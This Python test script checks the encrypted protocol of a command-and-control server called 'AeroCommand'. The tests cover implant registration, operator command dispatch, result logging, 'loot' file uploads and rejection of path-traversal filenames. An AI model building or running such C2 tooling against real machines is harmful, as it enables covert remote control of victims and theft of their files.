"""End-to-end protocol tests for the AeroCommand C2 server.

Exercises the full encrypted pipeline against server.py's Flask app using
the werkzeug test client (no open ports): RSA+AES hybrid registration,
encrypted command dispatch, result delivery, file upload, and rejection of
all plaintext payloads.

Run:  python test_protocol.py
"""
import base64
import json
import os
import tempfile

os.environ.setdefault("OPERATOR_TOKEN", "test-operator-token-123456")

import server
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes

# Isolate DB + loot from the real ones
_tmp = tempfile.mkdtemp(prefix="aerocommand_test_")
server.DB_FILE = os.path.join(_tmp, "test.db")
server.LOOT_DIR = os.path.join(_tmp, "loot")
server.init_db()

c = server.app.test_client()
aes_key = get_random_bytes(32)
CID = "1.2.3.4:999"


def enc_payload(obj) -> str:
    """AES-256-GCM encrypt a dict exactly like client.py does (nonce+tag+ct, b64)."""
    cipher = AES.new(aes_key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(cipher.nonce + tag + ct).decode()


def dec_payload(raw_b64: bytes):
    raw = base64.b64decode(raw_b64)
    nonce, tag, ct = raw[:16], raw[16:32], raw[32:]
    dec = AES.new(aes_key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
    return json.loads(dec)


# 1. RSA public key fetch
r = c.get("/rsa_pub")
assert r.status_code == 200 and b"BEGIN" in r.data, "rsa_pub failed"
pub = RSA.import_key(r.data.decode())

# 2. Hybrid registration establishes the session key
reg = {"client_id": CID, "host": "TESTBOX", "ip": "1.2.3.4", "pid": 999,
       "os": "Windows 11", "user": "tester", "admin": False}
rsa_cipher = PKCS1_OAEP.new(pub, hashAlgo=SHA256)
enc_key = base64.b64encode(rsa_cipher.encrypt(aes_key)).decode()
r = c.post("/register", json={"encrypted_session_key": enc_key, "payload": enc_payload(reg)})
assert r.status_code == 200, f"register failed: {r.status_code} {r.data}"
assert CID in server.client_sessions, "session key not stored"

# 3. Plaintext registration rejected
r = c.post("/register", json=reg)
assert r.status_code == 400, f"plaintext register not rejected: {r.status_code}"

# 4. Unknown client polling gets 401 empty body (re-register signal), never plaintext
r = c.get("/cmd?id=9.9.9.9:1")
assert r.status_code == 401 and not r.data, f"unknown-client poll: {r.status_code} {r.data!r}"

# 5. Operator API: bearer auth enforced (constant-time compare path)
r = c.post("/api/send_command", json={"client_id": CID, "command": "pwd"})
assert r.status_code in (401, 503), "send_command open without token"
r = c.post("/api/send_command", json={"client_id": CID, "command": "pwd"},
           headers={"Authorization": "Bearer wrong-token"})
assert r.status_code == 403, "bad token accepted"
r = c.post("/api/send_command", json={"client_id": CID, "command": "pwd"},
           headers={"Authorization": "Bearer test-operator-token-123456"})
assert r.status_code == 200, f"send_command failed: {r.data}"

# 6. Command poll returns AES-encrypted command
r = c.get(f"/cmd?id={CID}")
assert r.status_code == 200 and r.data, "expected encrypted command"
assert dec_payload(r.data) == {"command": "pwd"}, "command payload mismatch"

# 7. Empty poll: 200 with empty body (no plaintext {})
r = c.get(f"/cmd?id={CID}")
assert r.status_code == 200 and not r.data, "empty poll should be empty body"

# 8. Encrypted result accepted
r = c.post(f"/result?id={CID}",
           data=enc_payload({"command": "pwd", "output": "C:\\Users\\tester", "client_id": CID}),
           content_type="application/octet-stream")
assert r.status_code == 200, f"result rejected: {r.status_code}"

import sqlite3
with sqlite3.connect(server.DB_FILE) as conn:
    rows = conn.execute("SELECT output FROM command_logs WHERE client_id=? ORDER BY id", (CID,)).fetchall()
assert any(r[0] == "C:\\Users\\tester" for r in rows), f"result not logged: {rows}"

# 9. Plaintext result rejected with 400
r = c.post(f"/result?id={CID}", json={"output": "plain", "client_id": CID})
assert r.status_code == 400, f"plaintext result not rejected: {r.status_code}"

# 10. Encrypted upload lands in loot dir
png = b"\x89PNG\r\n\x1a\n fake-image-bytes"
r = c.post(f"/upload?id={CID}",
           data=enc_payload({"name": "shot.png", "file": base64.b64encode(png).decode(), "client_id": CID}),
           content_type="application/octet-stream")
assert r.status_code == 200, f"upload rejected: {r.status_code}"
loot_path = os.path.join(server.LOOT_DIR, "TESTBOX", "shot.png")
assert os.path.exists(loot_path), "loot file not saved"
assert open(loot_path, "rb").read() == png, "loot content mismatch"

# 11. Plaintext upload rejected with 400
r = c.post(f"/upload?id={CID}", json={"name": "x.txt", "file": ""})
assert r.status_code == 400, f"plaintext upload not rejected: {r.status_code}"

# 12. Path traversal via filename is neutralized
evil_name = "..\\..\\..\\pwned_traversal.txt"
r = c.post(f"/upload?id={CID}",
           data=enc_payload({"name": evil_name, "file": base64.b64encode(b"traversal").decode(), "client_id": CID}),
           content_type="application/octet-stream")
assert r.status_code == 200, f"traversal upload failed: {r.status_code}"
assert not os.path.exists(os.path.join(_tmp, "pwned_traversal.txt")), "PATH TRAVERSAL SUCCEEDED!"
loot_files = os.listdir(os.path.join(server.LOOT_DIR, "TESTBOX"))
assert any("pwned_traversal" in f for f in loot_files), f"sanitized name missing: {loot_files}"

# 13. Absolute-path filenames are also contained
r = c.post(f"/upload?id={CID}",
           data=enc_payload({"name": "C:\\Windows\\System32\\evil.sys", "file": base64.b64encode(b"x").decode(), "client_id": CID}),
           content_type="application/octet-stream")
assert r.status_code == 200
assert not os.path.exists("C:\\Windows\\System32\\evil.sys"), "absolute path escape!"

# 14. Oversized request body rejected by MAX_CONTENT_LENGTH (413)
r = c.post(f"/result?id={CID}", data=b"A" * (101 * 1024 * 1024),
           content_type="application/octet-stream")
assert r.status_code == 413, f"oversized body not rejected: {r.status_code}"

print("ALL PROTOCOL TESTS PASSED")
